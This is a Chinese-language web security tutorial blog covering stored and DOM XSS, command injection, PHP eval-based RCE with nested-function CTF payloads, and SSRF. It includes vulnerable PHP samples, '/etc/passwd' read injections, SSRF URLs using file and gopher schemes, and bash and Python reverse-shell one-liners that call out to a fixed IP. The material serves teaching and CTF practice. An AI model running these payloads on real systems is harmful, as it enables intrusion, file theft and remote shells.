<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_GET[&#39;a&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><ul>
<li>存储型XSS与反射型XSS基本一致，只是我们的js代码被存储在数据库中，能够长久保持，在管理员访问该页面时候就能够触发攻击，而不需要诱导管理员打开指定的页面。例如我们之前开发的网站就存在xss漏洞，例如我们在留言处写入一个js代码alert来弹个窗，尝试看看：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200701212357.png" alt="微信图片_20200701212357"></p>
<ul>
<li>我们访问到我们留言的页面就会发现这个js代码同样被执行了，因为我们存储到了数据库，在访问相应页面时候将其从数据库中取出，打印出来，浏览器再解析了js代码，导致了xss漏洞。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200701212731.png" alt="微信截图_20200701212731"></p>
<h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM-XSS"></a>DOM-XSS</h4><ul>
<li>我们在上面获取cookie时候已经接触过了dom，也就是document对象。它能够控制html的内容，可以动态添加html代码，所以DOM-XSS可以说是没有经过后端处理的xss,在前端和后端分离程度较高的网站上极为容易出现。又来一个简单代码：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;a()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> xss = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;xss&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.write(xss);</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里完全是前端代码，我们定义了一个text输入框他的id为xss，一个submit按钮，<code>onclick</code>是值点击后执行指定的js代码。这里在点击后会调用a函数，这个函数我们在后面的js代码部分有定义， <code>var xss document.getElementById(&#39;xss&#39;).value;</code>是指获取id为xss的html标签的值，然后定义并赋值给xss变量，<code>document.write(xss);</code>将获取到文本框的值写到html里面去。这个写进的内容同样会被喧嚷执行。如果此时我们输入的是一个恶意的js，那么我们就可以窃取到cookie.</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200701220402.png" alt="微信截图_20200701220402"></p>
<ul>
<li>提交就能执行js代码。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/image-20200701220500585.png" alt="image-20200701220500585"></p>
<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><ul>
<li><p>漏洞原理</p>
</li>
<li><p>漏洞的原理比较简单主要是web程序使用了执行系统命令的函数，而该函数的参数可以被黑客所控制，导致执行任意的系统命令。</p>
</li>
<li><p>PHP中常见执行系统命令的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
</li>
<li><p>常见利用场景</p>
<ul>
<li>执行ping命令网页</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;ping一下吧&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;site&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;查询&quot;&gt;</span><br><span class="line">	&lt;&#x2F;form&gt;	</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">echo  system(&#39;chcp 65001&amp;ping &#39;.$_GET[&#39;site&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用方法</p>
<ul>
<li>系统命令中执行同时执行多条命令的方法</li>
<li>&amp; 和&amp;&amp;</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a &amp; b 表示a和b同时运行</span><br><span class="line">a &amp;&amp; b表示 a运行成功后再运行b</span><br><span class="line">例如： ping baidu.com &amp; whoami</span><br><span class="line">	  ping baidu.com &amp;&amp; whoami</span><br></pre></td></tr></table></figure>

<ul>
<li>管道符“|”</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一个命令command 1执行的结果作为command 2的输入传给command 2</span><br><span class="line"></span><br><span class="line">例如：echo &quot;admi3n&quot;|grep &quot;3&quot; 先打印&quot;admi3n&quot;这个字符串，将打印的字符串传给第二个grep命令，也就是说grep命令要在字符串中搜索含有3的内容。这样也能够给执行两条命令</span><br><span class="line"></span><br><span class="line">例如：ping baidu.com | whoami</span><br></pre></td></tr></table></figure>

<ul>
<li>echo </li>
</ul>
<blockquote>
<p>打印字符串与php一样</p>
</blockquote>
<ul>
<li>dir和ls</li>
</ul>
<blockquote>
<p>windows中dir显示当前文件目录</p>
<p>linux中ls显示当前目录</p>
</blockquote>
<ul>
<li>&gt; </li>
</ul>
<blockquote>
<p>写文件例如：echo “6666”&gt;1.txt 即生成一个内容为666的1.txt</p>
</blockquote>
</li>
</ul>
<h4 id="利用命令执行读取文件"><a href="#利用命令执行读取文件" class="headerlink" title="利用命令执行读取文件"></a>利用命令执行读取文件</h4><p>还是以ping命令为例子，配合管道符读取文件，如dvwa中提供了一个ping服务，当我们输入如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baidu.com &amp; cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>对应到服务器会执行如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com &amp; cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>顺道给不懂的同学讲一下/etc/passwd文件。</p>
<blockquote>
<p>该文件中包含了所有用户登录名清单；为所有用户指定了主目录；在登录时使用的 shell 程序名称等。该文件还保存了用户口令；给每个用户提供系统识别号</p>
</blockquote>
<p>该文件在linux系统下是必不可少的，并且通常来说如果不特别做权限设置，以我们web服务下常用的www用户组是具有该文件的读权限的，因此当我们需要验证该漏洞是否可以被利用时会去尝试读取该文件。</p>
<h4 id="利用命令执行获取shell（没有服务器的可以自己上两台虚拟机试试）"><a href="#利用命令执行获取shell（没有服务器的可以自己上两台虚拟机试试）" class="headerlink" title="利用命令执行获取shell（没有服务器的可以自己上两台虚拟机试试）"></a>利用命令执行获取shell（没有服务器的可以自己上两台虚拟机试试）</h4><p>反弹shell是什么？反弹shell你可以理解为反弹一个命令行到我们攻击端，我们前面所说的命令执行都是建立在命令行的基础下，像我们用windows远程连接，xshell等软件连接可以视为正向连接，即我们客户端去请求服务端的服务；反弹shell则相反，是服务器向客户端请求。</p>
<p>有很多种情况下需要用到反向连接，如：</p>
<ul>
<li>靶机防火墙规则限制</li>
<li>靶机可以出网（比如家用电脑连接的是路由器的网络，在isp提供一个公网ip给我们的情况下外网是无法访问我们的，但我们可以访问外网；对流量出入规则做了限制等等的情况）</li>
<li>其他复杂情况</li>
</ul>
<p>为方便理解直接以两台服务器为例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A(攻击机)</span><br><span class="line">B(靶机)</span><br></pre></td></tr></table></figure>

<p>nc(netcat)命令通常被我们用于端口的监听，当我们在攻击机器使用nc命令监听端口，会使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port(端口)</span><br></pre></td></tr></table></figure>

<blockquote>
<p> -l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
</blockquote>
<p>之后攻击机会持续监听该端口，而此时我们在靶机上利用命令执行执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;134.175.168.213&#x2F;6789 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>这里的ip和port指的就是我们攻击机的ip以及它所监听的端口。</p>
<p>想深究原理的同学可以看下面的文章：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
<p>若无法使用bash弹shell，还可以使用其他如python等弹：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;134.175.168.213&quot;,6789));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>

<p>windows下同样也可以弹shell，有兴趣的可以去了解一下。</p>
<h4 id="长度限制执行命令"><a href="#长度限制执行命令" class="headerlink" title="长度限制执行命令"></a>长度限制执行命令</h4><p>当我们遇到长度限制时我们要执行命令会很艰难，比如限制了长度不会超过10或者7或者更短，那么此时我们想利用cat读取稍微长一点的文件都成为一个难题了，而想反弹shell更加不可能了，一个简单粗暴的例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">7</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们通常不会这么写代码，但不排除各种情况，当我们想使用cat命令时，我们可以利用&gt;：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;cat</span><br></pre></td></tr></table></figure>

<p>把空字符串写到名为cat的文件，在linux下命令行允许我们使用一些正则表达式，因此我们可以使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c* &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>读取到/etc/passwd文件的内容，当然此时我们只逃逸了一个字符的长度，对于这道题来说还是无法执行命令的，这里就不深究了，这是我们比赛的一道题目，感兴趣想看具体怎么解的可以看Gq师傅的博客：<a target="_blank" rel="noopener" href="https://www.plasf.cn/2020/07/02/Tstar/#%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%BE%97flag">长度限制执行命令</a></p>
<h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><p>代码执行漏洞跟命令执行有点像，只不过如果存在代码执行漏洞的话大概率可以用来构造成命令执行漏洞，如果存在代码执行漏洞并且可以被你利用，你可以认为你已经拿下这台服务器的web权限了，但因为各种原因环境原因，可能你拿到的用户权限有限，或者有些关键的函数被禁了，因此拿下web权限不等于拿下服务器权限。</p>
<p>可以理解为你可以利用该漏洞在服务器上面执行代码，具体执行什么代码就是由网站后端是用什么语言决定的，此类漏洞存在着各种各样的情况，通常是搭配其他漏洞一起利用的。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>关键词有二：assert和eval</p>
<p>assert允许我们传入一个表达式并执行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目分析：</p>
<p>其中正则里面的\w表示a-z、A-Z、0-9，以及下划线。(?R)是引用当前表达式的意思，即可以用\w+((?R)?)替换到(?R)的位置，(?R)? 这里多一个?表示可以有引用，也就是说可以衍生匹配。</p>
<p>也就是说<code>/[^\W]+\((?R)?\)/</code>，只匹配<code>字符串+()</code>的类型，并且括号内为空字符串仅可以由26个小写字母组成。可以看一个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code1 = <span class="string">&quot;echo();&quot;</span>;</span><br><span class="line">$code2 = <span class="string">&quot;echo(123);&quot;</span>;</span><br><span class="line">$code3 = <span class="string">&quot;echo(phpinfo());&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code1));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code2));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code3));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line"><span class="keyword">echo</span>(<span class="number">123</span>);</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>我们分别传入了<code>echo();</code>，<code>echo(123)</code>和<code>echo(phpinfo())</code>，可以看到参数一最终替换剩下一个<code>(;)</code>分号，而参数二无法匹配成功替换失败，参数三是echo嵌套一个phpinfo函数，同样匹配成功替换剩下一个<code>(;)</code>分号。那么这里就说明了我们这个正则虽然不能能够匹配存在参数的函数，但是可以嵌套函数使用。</p>
<p>然后我们需要利用eval()函数去读取他的目录。</p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>我们知道<code>scandir()</code>函数式能够读取目录源码，但是他必须带有参数<code>（&#39;.&#39;）</code>也就是<code>scandir(&#39;.&#39;)</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php var_dump(scandir(&#39;.&#39;)); ?&gt;</span><br></pre></td></tr></table></figure>

<p>但是上面的正则匹配不允许出现函数里面有点的，所以我们要想办法构造这个点。</p>
<p>利用localeconv() 取点，localeconv() 会返回当地的金融信息的数组，而第一个元素即为点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(localeconv());</span><br></pre></td></tr></table></figure>

<p>构造方法只需取第一个元素即可 pos()、current() 均可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php var_dump(pos(localeconv())); ?&gt;</span><br></pre></td></tr></table></figure>

<p>结合起来就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php var_dump(scandir(pos(localeconv()))); ?&gt;</span><br></pre></td></tr></table></figure>

<p>使用end读取后一个文件名读取ﬂag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(scandir(pos(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>使用readﬁle读取ﬂag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:8080&#x2F;code&#x2F;code.php? code&#x3D;var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>利用当前秒数构造点  ，利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之 内，我们只需等到46秒时候就能将点给构造出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(chr(pos(localtime())));</span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:8080&#x2F;code&#x2F;code.php? code&#x3D;var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>

<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>利用SESSIONID来传参</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>在cookie出传参</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<h4 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h4><p>利用 getallheaders() 来获取参数RCE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>

<p>在最后在最后一条请求头添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>

<h4 id="跳转目录情况"><a href="#跳转目录情况" class="headerlink" title="跳转目录情况"></a>跳转目录情况</h4><ul>
<li><p>假设ﬂag在上层目录文件的情况，我们需要跳转到上层目录。 </p>
</li>
<li><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录。<code>scandir()</code> ，读取当前目录在第二个元素就能读取两个点</p>
</li>
<li><p><code>localtime</code>第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳</p>
</li>
<li><p>构造读取上层目录payload</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>

<ul>
<li>构造读取上层目录文件payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

<h4 id="其他小技巧"><a href="#其他小技巧" class="headerlink" title="其他小技巧"></a>其他小技巧</h4><p>利用三角函数构造斜杠</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));</span><br></pre></td></tr></table></figure>

<p>利用随机令牌构造点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(strrev(uniqid())))));</span><br></pre></td></tr></table></figure>

<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir()   函数改变当前的目录。</span><br><span class="line">localeconv() 返回当地金融信息，其中包含了点</span><br><span class="line">readfile()   输出一个文件</span><br><span class="line">chr(pos(localtime())) 利用当前秒数构造点    </span><br><span class="line">current()    返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()      current() 的别名</span><br><span class="line">next()     函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()      将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()   函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机 键名的数组。 </span><br><span class="line">array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()   获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line">show_source() 高亮读取文件</span><br><span class="line">highlight_file() 高亮读取文件</span><br></pre></td></tr></table></figure>

<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>ssrf漏洞是什么</p>
<p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p>
<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
<p>比如有个URL是这样的：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/ssrf.php?url=http://www.abc.com/a.jpg</span><br></pre></td></tr></table></figure>

<p>这个URL原本是服务端发起请求获取链接地址的图片数据。</p>
<p>但是代码中没有对没有对一些协议或者IP字符等进行过滤，导致存在SSRF漏洞的话，我们就可以使用一些协议来读取和执行相关命令，如内外网的端口和服务扫描，利用file协议读取本地敏感数据文件等等。</p>
<p>可能出现SSRF的函数有：<code>file_get_contents()</code>、<code>curl()</code>、<code>fsocksopen()</code>、<code>fopen()</code>等</p>
<p>存在SSRF漏洞的代码，这里拿<code>curl()</code>举栗子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//创建一个新的curl资源</span></span><br><span class="line">  $ch = curl_init();</span><br><span class="line">  <span class="comment">//设置URL和相应的选项</span></span><br><span class="line">  curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">  curl_setopt($ch,CURLOPT_HEADER,<span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//抓取URL并把它传递给浏览器</span></span><br><span class="line">  curl_exec($ch);</span><br><span class="line">  <span class="comment">//关闭curl资源，并且释放系统资源</span></span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用一些协议来读取和执行相关命令，比如</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/ssrf.php?url=http://127.0.0.1:22</span><br><span class="line">http://www.xxx.com/ssrf.php?url=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/ssrf.php?url=dict://127.0.0.1:22/</span><br><span class="line">http://www.xxx.com/ssrf.php?url=gopher://127.0.0.1:2233/_test</span><br></pre></td></tr></table></figure>

<p>所以服务器往往会对接收进来的参数进行过滤，或者禁止不常用的协议，禁用IP等等，那么我们如何去绕过呢。</p>
